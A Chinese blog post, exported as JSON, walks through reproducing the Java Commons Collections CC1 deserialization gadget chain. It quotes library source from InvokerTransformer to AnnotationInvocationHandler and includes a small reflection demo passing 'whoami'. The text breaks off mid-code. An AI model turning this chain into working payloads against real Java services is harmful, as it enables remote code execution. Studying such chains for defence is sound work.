{"title":"Java的CC1复现","uid":"0e8f1603b8315950f63fd25486814bb0","slug":"Java的CC1复现","date":"2023-08-30T14:08:47.000Z","updated":"2023-08-30T14:17:23.738Z","comments":true,"path":"api/articles/Java的CC1复现.json","keywords":null,"cover":[],"content":"<p>JAVA的CC1是一直复现一直复现反反复复，这里就复现完了就进行记录。</p>\n<h1 id=\"复现：\"><a href=\"#复现：\" class=\"headerlink\" title=\"复现：\"></a>复现：</h1><h4 id=\"漏洞点（InvokerTransformer-gt-transform）\"><a href=\"#漏洞点（InvokerTransformer-gt-transform）\" class=\"headerlink\" title=\"漏洞点（InvokerTransformer-&gt;transform）\"></a>漏洞点（InvokerTransformer-&gt;transform）</h4><pre class=\"line-numbers language-java\" data-language=\"java\"><code class=\"language-java\"><span class=\"token keyword\">public</span> <span class=\"token class-name\">InvokerTransformer</span><span class=\"token punctuation\">(</span><span class=\"token class-name\">String</span> methodName<span class=\"token punctuation\">,</span> <span class=\"token class-name\">Class</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span> paramTypes<span class=\"token punctuation\">,</span> <span class=\"token class-name\">Object</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span> args<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span>\n    <span class=\"token keyword\">super</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    iMethodName <span class=\"token operator\">=</span> methodName<span class=\"token punctuation\">;</span>\n    iParamTypes <span class=\"token operator\">=</span> paramTypes<span class=\"token punctuation\">;</span>\n    iArgs <span class=\"token operator\">=</span> args<span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">&#125;</span>\n\n\n\n<span class=\"token keyword\">public</span> <span class=\"token class-name\">Object</span> <span class=\"token function\">transform</span><span class=\"token punctuation\">(</span><span class=\"token class-name\">Object</span> input<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span>\n    <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span>input <span class=\"token operator\">==</span> <span class=\"token keyword\">null</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span>\n        <span class=\"token keyword\">return</span> <span class=\"token keyword\">null</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">&#125;</span>\n    <span class=\"token keyword\">try</span> <span class=\"token punctuation\">&#123;</span>\n        <span class=\"token class-name\">Class</span> cls <span class=\"token operator\">=</span> input<span class=\"token punctuation\">.</span><span class=\"token function\">getClass</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        <span class=\"token class-name\">Method</span> method <span class=\"token operator\">=</span> cls<span class=\"token punctuation\">.</span><span class=\"token function\">getMethod</span><span class=\"token punctuation\">(</span>iMethodName<span class=\"token punctuation\">,</span> iParamTypes<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        <span class=\"token keyword\">return</span> method<span class=\"token punctuation\">.</span><span class=\"token function\">invoke</span><span class=\"token punctuation\">(</span>input<span class=\"token punctuation\">,</span> iArgs<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n            \n    <span class=\"token punctuation\">&#125;</span> <span class=\"token keyword\">catch</span> <span class=\"token punctuation\">(</span><span class=\"token class-name\">NoSuchMethodException</span> ex<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span>\n        <span class=\"token keyword\">throw</span> <span class=\"token keyword\">new</span> <span class=\"token class-name\">FunctorException</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"InvokerTransformer: The method '\"</span> <span class=\"token operator\">+</span> iMethodName <span class=\"token operator\">+</span> <span class=\"token string\">\"' on '\"</span> <span class=\"token operator\">+</span> input<span class=\"token punctuation\">.</span><span class=\"token function\">getClass</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span> <span class=\"token string\">\"' does not exist\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">&#125;</span> <span class=\"token keyword\">catch</span> <span class=\"token punctuation\">(</span><span class=\"token class-name\">IllegalAccessException</span> ex<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span>\n        <span class=\"token keyword\">throw</span> <span class=\"token keyword\">new</span> <span class=\"token class-name\">FunctorException</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"InvokerTransformer: The method '\"</span> <span class=\"token operator\">+</span> iMethodName <span class=\"token operator\">+</span> <span class=\"token string\">\"' on '\"</span> <span class=\"token operator\">+</span> input<span class=\"token punctuation\">.</span><span class=\"token function\">getClass</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span> <span class=\"token string\">\"' cannot be accessed\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">&#125;</span> <span class=\"token keyword\">catch</span> <span class=\"token punctuation\">(</span><span class=\"token class-name\">InvocationTargetException</span> ex<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span>\n        <span class=\"token keyword\">throw</span> <span class=\"token keyword\">new</span> <span class=\"token class-name\">FunctorException</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"InvokerTransformer: The method '\"</span> <span class=\"token operator\">+</span> iMethodName <span class=\"token operator\">+</span> <span class=\"token string\">\"' on '\"</span> <span class=\"token operator\">+</span> input<span class=\"token punctuation\">.</span><span class=\"token function\">getClass</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span> <span class=\"token string\">\"' threw an exception\"</span><span class=\"token punctuation\">,</span> ex<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">&#125;</span>\n<span class=\"token punctuation\">&#125;</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<p>这里的漏洞点在transform中。这里先写一个demo来进行测试。</p>\n<pre class=\"line-numbers language-java\" data-language=\"java\"><code class=\"language-java\">cmd cmd <span class=\"token operator\">=</span> <span class=\"token keyword\">new</span> <span class=\"token function\">cmd</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token class-name\">InvokerTransformer</span> <span class=\"token class-name\">InvokerTransformer</span> <span class=\"token operator\">=</span> <span class=\"token keyword\">new</span> <span class=\"token class-name\">InvokerTransformer</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"StringA\"</span><span class=\"token punctuation\">,</span> <span class=\"token keyword\">new</span> <span class=\"token class-name\">Class</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">&#123;</span><span class=\"token class-name\">String</span><span class=\"token punctuation\">.</span><span class=\"token keyword\">class</span><span class=\"token punctuation\">&#125;</span><span class=\"token punctuation\">,</span> <span class=\"token keyword\">new</span> <span class=\"token class-name\">Object</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">&#123;</span><span class=\"token string\">\"whoami\"</span><span class=\"token punctuation\">&#125;</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token class-name\">InvokerTransformer</span><span class=\"token punctuation\">.</span><span class=\"token function\">transform</span><span class=\"token punctuation\">(</span>cmd<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span></span></code></pre>\n\n<p>接下来我们就需要进行查找，xx.transform的方法，xx可控或者直接调用InvokerTransformer的transform</p>\n<h4 id=\"调用栈1：（TransformedMap-gt-checkValue）\"><a href=\"#调用栈1：（TransformedMap-gt-checkValue）\" class=\"headerlink\" title=\"调用栈1：（TransformedMap-&gt;checkValue）\"></a>调用栈1：（TransformedMap-&gt;checkValue）</h4><pre class=\"line-numbers language-java\" data-language=\"java\"><code class=\"language-java\"><span class=\"token keyword\">protected</span> <span class=\"token class-name\">Object</span> <span class=\"token function\">checkSetValue</span><span class=\"token punctuation\">(</span><span class=\"token class-name\">Object</span> value<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span>\n    <span class=\"token keyword\">return</span> valueTransformer<span class=\"token punctuation\">.</span><span class=\"token function\">transform</span><span class=\"token punctuation\">(</span>value<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">&#125;</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span></span></code></pre>\n\n<p>这里看一下构造方法，调用了父类的构造方法，经过查看发现将当前的map赋值成父类的map。但是这个构造函数是protected的，所以不能直接进行调用，这里寻找调用栈。</p>\n<pre class=\"line-numbers language-java\" data-language=\"java\"><code class=\"language-java\"><span class=\"token keyword\">protected</span> <span class=\"token class-name\">TransformedMap</span><span class=\"token punctuation\">(</span><span class=\"token class-name\">Map</span> map<span class=\"token punctuation\">,</span> <span class=\"token class-name\">Transformer</span> keyTransformer<span class=\"token punctuation\">,</span> <span class=\"token class-name\">Transformer</span> valueTransformer<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span>\n    <span class=\"token keyword\">super</span><span class=\"token punctuation\">(</span>map<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token keyword\">this</span><span class=\"token punctuation\">.</span>keyTransformer <span class=\"token operator\">=</span> keyTransformer<span class=\"token punctuation\">;</span>\n    <span class=\"token keyword\">this</span><span class=\"token punctuation\">.</span>valueTransformer <span class=\"token operator\">=</span> valueTransformer<span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">&#125;</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<p>发现有两个类的静态方法进行了调用。</p>\n<ul>\n<li>TranformedMap::decorate</li>\n<li>TranformedMap::decorateTransform</li>\n</ul>\n<p>因为checksetvalue是protected，所以我们无法直接进行调用，所以我们找，谁调用了checksetvalue。</p>\n<h4 id=\"调用栈2：AbstractInputCheckedMapDecorator-setValue\"><a href=\"#调用栈2：AbstractInputCheckedMapDecorator-setValue\" class=\"headerlink\" title=\"调用栈2：AbstractInputCheckedMapDecorator::setValue\"></a>调用栈2：AbstractInputCheckedMapDecorator::setValue</h4><pre class=\"line-numbers language-java\" data-language=\"java\"><code class=\"language-java\"><span class=\"token keyword\">public</span> <span class=\"token class-name\">Object</span> <span class=\"token function\">setValue</span><span class=\"token punctuation\">(</span><span class=\"token class-name\">Object</span> value<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span>\n    value <span class=\"token operator\">=</span> parent<span class=\"token punctuation\">.</span><span class=\"token function\">checkSetValue</span><span class=\"token punctuation\">(</span>value<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token keyword\">return</span> entry<span class=\"token punctuation\">.</span><span class=\"token function\">setValue</span><span class=\"token punctuation\">(</span>value<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">&#125;</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span></span></code></pre>\n\n<p>这里找谁调用setvalue其实会很复杂，所以我们这里就进行分析。关注四个点：</p>\n<ul>\n<li>代码追踪点（就是上面的setValue）</li>\n<li>构造函数</li>\n<li>入口点（有些构造函数是private或者protected等一些特殊情况）</li>\n<li>成员变量</li>\n</ul>\n<h5 id=\"内部调用栈1：setValue实现了Map-Entry\"><a href=\"#内部调用栈1：setValue实现了Map-Entry\" class=\"headerlink\" title=\"内部调用栈1：setValue实现了Map.Entry\"></a>内部调用栈1：setValue实现了Map.Entry</h5><p>这里找谁调用了MapEntry的静态内置类</p>\n<h5 id=\"内部调用栈2：静态内置类（EntrySetIterator-next）\"><a href=\"#内部调用栈2：静态内置类（EntrySetIterator-next）\" class=\"headerlink\" title=\"内部调用栈2：静态内置类（EntrySetIterator::next）\"></a>内部调用栈2：静态内置类（EntrySetIterator::next）</h5><p>这里发现静态内置类的next方法中进行了调用，这里还是关注上面那四个点，这里的构造函数其实就是将传入的值赋值给父类的iterator。所以这里进行迭代的时候还需要看一下父类的HasNext方法。</p>\n<pre class=\"line-numbers language-java\" data-language=\"java\"><code class=\"language-java\"><span class=\"token keyword\">protected</span> <span class=\"token class-name\">EntrySetIterator</span><span class=\"token punctuation\">(</span><span class=\"token class-name\">Iterator</span> iterator<span class=\"token punctuation\">,</span> <span class=\"token class-name\">AbstractInputCheckedMapDecorator</span> parent<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span>\n    <span class=\"token keyword\">super</span><span class=\"token punctuation\">(</span>iterator<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token keyword\">this</span><span class=\"token punctuation\">.</span>parent <span class=\"token operator\">=</span> parent<span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">&#125;</span>\n\n<span class=\"token keyword\">public</span> <span class=\"token class-name\">Object</span> <span class=\"token function\">next</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span>\n    <span class=\"token class-name\">Map<span class=\"token punctuation\">.</span>Entry</span> entry <span class=\"token operator\">=</span> <span class=\"token punctuation\">(</span><span class=\"token class-name\">Map<span class=\"token punctuation\">.</span>Entry</span><span class=\"token punctuation\">)</span> iterator<span class=\"token punctuation\">.</span><span class=\"token function\">next</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token keyword\">return</span> <span class=\"token keyword\">new</span> <span class=\"token class-name\">MapEntry</span><span class=\"token punctuation\">(</span>entry<span class=\"token punctuation\">,</span> parent<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">&#125;</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<p>查看一下EntrySetIterator的父类：</p>\n<pre class=\"line-numbers language-java\" data-language=\"java\"><code class=\"language-java\"><span class=\"token keyword\">public</span> <span class=\"token keyword\">class</span> <span class=\"token class-name\">AbstractIteratorDecorator</span> <span class=\"token keyword\">implements</span> <span class=\"token class-name\">Iterator</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n\n<p>父类的hasNext方法其实就是判断了传入的map是否有元素。</p>\n<pre class=\"line-numbers language-java\" data-language=\"java\"><code class=\"language-java\"><span class=\"token keyword\">public</span> <span class=\"token keyword\">boolean</span> <span class=\"token function\">hasNext</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span>\n    <span class=\"token keyword\">return</span> iterator<span class=\"token punctuation\">.</span><span class=\"token function\">hasNext</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">&#125;</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span></span></code></pre>\n\n<p>其实就是实现了Iterator接口，这里就可以说明其实就是迭代器，迭代器就关注两个方法，一个hasnext，一个next。 这里细说一下hasNext和Next方法。给出下面的demo</p>\n<pre class=\"line-numbers language-java\" data-language=\"java\"><code class=\"language-java\"><span class=\"token comment\">// 正常我们遍历的时候都会用下面来进行遍历，其实下面遍历的原理是</span>\n\n<span class=\"token keyword\">for</span><span class=\"token punctuation\">(</span><span class=\"token class-name\">Map<span class=\"token punctuation\">.</span>Entry</span><span class=\"token generics\"><span class=\"token punctuation\">&lt;</span><span class=\"token class-name\">Object</span><span class=\"token punctuation\">,</span><span class=\"token class-name\">Object</span><span class=\"token punctuation\">></span></span> entry<span class=\"token operator\">:</span>entry<span class=\"token punctuation\">.</span><span class=\"token function\">set</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span><span class=\"token punctuation\">&#125;</span>\n\n\n<span class=\"token comment\">// 其实原理就是这个，先判断是否可以有下一个对象，如果有再进行遍历。</span>\n<span class=\"token keyword\">while</span><span class=\"token punctuation\">(</span>迭代器<span class=\"token punctuation\">.</span><span class=\"token function\">hasNext</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span>\n    <span class=\"token class-name\">String</span> a <span class=\"token operator\">=</span> 迭代器<span class=\"token punctuation\">.</span><span class=\"token function\">next</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token comment\">// 处理数据</span>\n<span class=\"token punctuation\">&#125;</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<h5 id=\"内部调用栈3：内部调用类EntrySet-iterator方法\"><a href=\"#内部调用栈3：内部调用类EntrySet-iterator方法\" class=\"headerlink\" title=\"内部调用栈3：内部调用类EntrySet::iterator方法\"></a>内部调用栈3：内部调用类EntrySet::iterator方法</h5><p>这里没有什么可以说的，就是一个典型的迭代器写法（后面有我的迭代器demo）</p>\n<pre class=\"line-numbers language-java\" data-language=\"java\"><code class=\"language-java\"><span class=\"token keyword\">public</span> <span class=\"token class-name\">Iterator</span> <span class=\"token function\">iterator</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span>\n    <span class=\"token keyword\">return</span> <span class=\"token keyword\">new</span> <span class=\"token class-name\">EntrySetIterator</span><span class=\"token punctuation\">(</span>collection<span class=\"token punctuation\">.</span><span class=\"token function\">iterator</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span> parent<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">&#125;</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span></span></code></pre>\n\n<h5 id=\"内部调用栈4：内部调用类-AbstractInputCheckedMapDecorator-entryset\"><a href=\"#内部调用栈4：内部调用类-AbstractInputCheckedMapDecorator-entryset\" class=\"headerlink\" title=\"内部调用栈4：内部调用类(AbstractInputCheckedMapDecorator::entryset)\"></a>内部调用栈4：内部调用类(AbstractInputCheckedMapDecorator::entryset)</h5><pre class=\"line-numbers language-java\" data-language=\"java\"><code class=\"language-java\"><span class=\"token keyword\">public</span> <span class=\"token class-name\">Set</span> <span class=\"token function\">entrySet</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span>\n    <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span><span class=\"token function\">isSetValueChecking</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span>\n        <span class=\"token keyword\">return</span> <span class=\"token keyword\">new</span> <span class=\"token class-name\">EntrySet</span><span class=\"token punctuation\">(</span>map<span class=\"token punctuation\">.</span><span class=\"token function\">entrySet</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span> <span class=\"token keyword\">this</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">&#125;</span> <span class=\"token keyword\">else</span> <span class=\"token punctuation\">&#123;</span>\n        <span class=\"token keyword\">return</span> map<span class=\"token punctuation\">.</span><span class=\"token function\">entrySet</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">&#125;</span>\n<span class=\"token punctuation\">&#125;</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<p>这里就先查看是否有<code>isSetValueChecking</code>（可能会被重写）然后才能进行循环。</p>\n<h5 id=\"总结内部调用栈2：\"><a href=\"#总结内部调用栈2：\" class=\"headerlink\" title=\"总结内部调用栈2：\"></a>总结内部调用栈2：</h5><p>内部调用栈2其实就是重写了Map方法，以及重新定义了entrySet方法，让entryset方法以迭代器的步骤来进行。</p>\n<p>Tip：</p>\n<ul>\n<li>迭代器的类实现<code>Iterable</code>接口</li>\n<li>迭代器的iterator 返回的对象实现<code>Iterator</code>接口</li>\n</ul>\n<h4 id=\"调用栈3：AnnotationInvocationHandler-readObject\"><a href=\"#调用栈3：AnnotationInvocationHandler-readObject\" class=\"headerlink\" title=\"调用栈3：AnnotationInvocationHandler::readObject\"></a>调用栈3：AnnotationInvocationHandler::readObject</h4><p>看函数的参数和构造方法</p>\n<pre class=\"line-numbers language-go\" data-language=\"go\"><code class=\"language-go\"><span class=\"token function\">AnnotationInvocationHandler</span><span class=\"token punctuation\">(</span>Class<span class=\"token operator\">&lt;</span>? extends Annotation<span class=\"token operator\">></span> <span class=\"token keyword\">type</span><span class=\"token punctuation\">,</span> Map<span class=\"token operator\">&lt;</span>String<span class=\"token punctuation\">,</span> Object<span class=\"token operator\">></span> memberValues<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span>\n    Class<span class=\"token operator\">&lt;</span>?<span class=\"token operator\">></span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span> superInterfaces <span class=\"token operator\">=</span> <span class=\"token keyword\">type</span><span class=\"token punctuation\">.</span><span class=\"token function\">getInterfaces</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span><span class=\"token operator\">!</span><span class=\"token keyword\">type</span><span class=\"token punctuation\">.</span><span class=\"token function\">isAnnotation</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">||</span>\n        superInterfaces<span class=\"token punctuation\">.</span>length <span class=\"token operator\">!=</span> <span class=\"token number\">1</span> <span class=\"token operator\">||</span>\n        superInterfaces<span class=\"token punctuation\">[</span><span class=\"token number\">0</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">!=</span> java<span class=\"token punctuation\">.</span>lang<span class=\"token punctuation\">.</span>annotation<span class=\"token punctuation\">.</span>Annotation<span class=\"token punctuation\">.</span>class<span class=\"token punctuation\">)</span>\n        throw <span class=\"token builtin\">new</span> <span class=\"token function\">AnnotationFormatError</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"Attempt to create proxy for a non-annotation type.\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    this<span class=\"token punctuation\">.</span><span class=\"token keyword\">type</span> <span class=\"token operator\">=</span> <span class=\"token keyword\">type</span><span class=\"token punctuation\">;</span>\n    this<span class=\"token punctuation\">.</span>memberValues <span class=\"token operator\">=</span> memberValues<span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">&#125;</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<p>这段代码的意思就是</p>\n<ul>\n<li>是一个Annotation</li>\n<li>长度为1</li>\n<li>第一个是Annotation的class</li>\n</ul>\n<p>然后进入到赋值</p>\n<pre class=\"line-numbers language-java\" data-language=\"java\"><code class=\"language-java\"><span class=\"token class-name\">AnnotationType</span> annotationType <span class=\"token operator\">=</span> <span class=\"token keyword\">null</span><span class=\"token punctuation\">;</span>\n        <span class=\"token keyword\">try</span> <span class=\"token punctuation\">&#123;</span>\n            annotationType <span class=\"token operator\">=</span> <span class=\"token class-name\">AnnotationType</span><span class=\"token punctuation\">.</span><span class=\"token function\">getInstance</span><span class=\"token punctuation\">(</span>type<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        <span class=\"token punctuation\">&#125;</span> <span class=\"token keyword\">catch</span><span class=\"token punctuation\">(</span><span class=\"token class-name\">IllegalArgumentException</span> e<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span>\n            <span class=\"token comment\">// Class is no longer an annotation type; time to punch out</span>\n            <span class=\"token keyword\">throw</span> <span class=\"token keyword\">new</span> <span class=\"token class-name\"><span class=\"token namespace\">java<span class=\"token punctuation\">.</span>io<span class=\"token punctuation\">.</span></span>InvalidObjectException</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"Non-annotation type in annotation serial stream\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        <span class=\"token punctuation\">&#125;</span>\n\n        <span class=\"token class-name\">Map</span><span class=\"token generics\"><span class=\"token punctuation\">&lt;</span><span class=\"token class-name\">String</span><span class=\"token punctuation\">,</span> <span class=\"token class-name\">Class</span><span class=\"token punctuation\">&lt;</span><span class=\"token operator\">?</span><span class=\"token punctuation\">></span><span class=\"token punctuation\">></span></span> memberTypes <span class=\"token operator\">=</span> annotationType<span class=\"token punctuation\">.</span><span class=\"token function\">memberTypes</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\n        <span class=\"token comment\">// If there are annotation members without values, that</span>\n        <span class=\"token comment\">// situation is handled by the invoke method.</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<p>这里的type就是上面赋值的annotation的class。</p>\n<h5 id=\"内部调用栈1：AnnotationType-getInstance\"><a href=\"#内部调用栈1：AnnotationType-getInstance\" class=\"headerlink\" title=\"内部调用栈1：AnnotationType.getInstance\"></a>内部调用栈1：AnnotationType.getInstance</h5><pre class=\"line-numbers language-java\" data-language=\"java\"><code class=\"language-java\"><span class=\"token keyword\">public</span> <span class=\"token keyword\">static</span> <span class=\"token class-name\">AnnotationType</span> <span class=\"token function\">getInstance</span><span class=\"token punctuation\">(</span>\n    <span class=\"token class-name\">Class</span><span class=\"token generics\"><span class=\"token punctuation\">&lt;</span><span class=\"token operator\">?</span> <span class=\"token keyword\">extends</span> <span class=\"token class-name\">Annotation</span><span class=\"token punctuation\">></span></span> annotationClass<span class=\"token punctuation\">)</span>\n<span class=\"token punctuation\">&#123;</span>\n    <span class=\"token class-name\">JavaLangAccess</span> jla <span class=\"token operator\">=</span> <span class=\"token class-name\"><span class=\"token namespace\">sun<span class=\"token punctuation\">.</span>misc<span class=\"token punctuation\">.</span></span>SharedSecrets</span><span class=\"token punctuation\">.</span><span class=\"token function\">getJavaLangAccess</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token class-name\">AnnotationType</span> result <span class=\"token operator\">=</span> jla<span class=\"token punctuation\">.</span><span class=\"token function\">getAnnotationType</span><span class=\"token punctuation\">(</span>annotationClass<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span> <span class=\"token comment\">// volatile read</span>\n    <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span>result <span class=\"token operator\">==</span> <span class=\"token keyword\">null</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span>\n        result <span class=\"token operator\">=</span> <span class=\"token keyword\">new</span> <span class=\"token class-name\">AnnotationType</span><span class=\"token punctuation\">(</span>annotationClass<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        <span class=\"token comment\">// try to CAS the AnnotationType: null -> result</span>\n        <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span><span class=\"token operator\">!</span>jla<span class=\"token punctuation\">.</span><span class=\"token function\">casAnnotationType</span><span class=\"token punctuation\">(</span>annotationClass<span class=\"token punctuation\">,</span> <span class=\"token keyword\">null</span><span class=\"token punctuation\">,</span> result<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span>\n            <span class=\"token comment\">// somebody was quicker -> read it's result</span>\n            result <span class=\"token operator\">=</span> jla<span class=\"token punctuation\">.</span><span class=\"token function\">getAnnotationType</span><span class=\"token punctuation\">(</span>annotationClass<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n            <span class=\"token keyword\">assert</span> result <span class=\"token operator\">!=</span> <span class=\"token keyword\">null</span><span class=\"token punctuation\">;</span>\n        <span class=\"token punctuation\">&#125;</span>\n    <span class=\"token punctuation\">&#125;</span>\n\n    <span class=\"token keyword\">return</span> result<span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">&#125;</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<p>这里的代码重点看第7行，这里将传入的annotationtype进行了new方法的调用</p>\n<h5 id=\"内部调用栈2：AnnotationType-AnnotationType构造方法\"><a href=\"#内部调用栈2：AnnotationType-AnnotationType构造方法\" class=\"headerlink\" title=\"内部调用栈2：AnnotationType::AnnotationType构造方法\"></a>内部调用栈2：AnnotationType::AnnotationType构造方法</h5><pre class=\"line-numbers language-java\" data-language=\"java\"><code class=\"language-java\"><span class=\"token keyword\">private</span> <span class=\"token class-name\">AnnotationType</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">final</span> <span class=\"token class-name\">Class</span><span class=\"token generics\"><span class=\"token punctuation\">&lt;</span><span class=\"token operator\">?</span> <span class=\"token keyword\">extends</span> <span class=\"token class-name\">Annotation</span><span class=\"token punctuation\">></span></span> annotationClass<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span>\n        <span class=\"token keyword\">if</span> <span 